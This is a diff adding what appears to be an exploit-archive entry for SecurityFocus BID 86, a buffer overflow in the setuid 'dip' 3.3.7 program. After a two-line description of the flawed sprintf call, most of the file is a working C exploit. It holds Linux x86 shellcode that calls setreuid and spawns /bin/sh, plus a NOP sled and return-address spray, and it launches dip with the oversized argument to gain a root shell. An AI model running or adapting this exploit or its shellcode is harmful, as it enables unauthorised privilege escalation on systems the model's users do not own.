@@ -1,0 +1,54 @@
+source: http://www.securityfocus.com/bid/86/info
+
+A buffer overflow resides in 'dip-3.3.7o' and derived programs. This is a problem only on systems where 'dip' is installed setuid. The culpable code is an 'sprintf()' in line 192 in 'main.c': 
+
+sprintf(buf, "%s/LCK..%s", _PATH_LOCKD, nam);
+
+/* Linux x86 dip 3.3.7p exploit by pr10n */
+
+
+#include <stdio.h>
+
+#define NOP 0x90
+
+
+/*thanks to hack.co.za*/
+char shellcode[] =
+          "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\xeb\x1d"
+          "\x5e\x88\x46\x07\x89\x46\x0c\x89\x76\x08\x89\xf3"
+          "\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0"
+          "\x31\xdb\x40\xcd\x80\xe8\xde\xff\xff\xff/bin/sh";
+
+
+
+unsigned long get_sp(void){ __asm__("movl %esp, %eax");}
+
+main(int argc, char *argv[]){
+
+char buf[136];
+int i;
+int offset=0,*ptr;
+long ret;
+
+
+if(argc!=2){
+printf("usage: %s offset\n",argv[0]);
+exit(0);}
+
+offset=atoi(argv[1]);
+
+ret=(get_sp()-offset);
+
+for(i=1;i<136;i+=4){
+*(long *)&buf[i]=ret;}
+
+printf("\nusing: 0x%x\n\n",ret);
+
+for(i=0;i<(sizeof(buf)-strlen(shellcode)-40);i++)
+buf[i]=NOP;
+
+memcpy(buf+i,shellcode,strlen(shellcode));
+
+execl("/usr/sbin/dip","dip","-k","-l",buf,(char *)0);
+
+}
